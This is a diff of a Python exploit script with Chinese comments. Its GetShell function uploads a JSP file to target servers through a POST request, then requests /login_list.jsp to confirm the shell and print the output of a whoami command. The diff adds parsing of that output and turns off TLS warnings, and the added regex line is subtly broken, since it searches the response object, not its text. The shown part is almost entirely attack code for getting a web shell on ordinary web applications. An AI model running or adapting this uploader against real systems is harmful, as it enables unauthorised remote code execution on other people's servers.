@@ -1,5 +1,9 @@
 import requests
 import sys
+import re
+import urllib3
+urllib3.disable_warnings()
+
 #本脚本只上传执行whoami命令的文件
 
 def GetShell(urllist):
@@ -10,11 +14,12 @@ def GetShell(urllist):
     requests.post(url, headers=headers, data=data,verify=False,timeout=5)
     listshell = urllist+"/login_list.jsp"
     listshellr = requests.get(url=listshell,verify=False,timeout=5)
+    a=re.search(r'<pre>(.*?)</pre>',listshellr, re.S).group(1)
 
 
     if listshellr.status_code == 200 and flag in listshellr.text:
         print(urllist+" 文件上传成功，地址为："+urllist+"/login_list.jsp"+"\n")
-        print("成功执行命令"+listshellr.text)
+        print("成功执行命令"+a)
     else:
         print("文件上传成功失败--请手动验证")
 
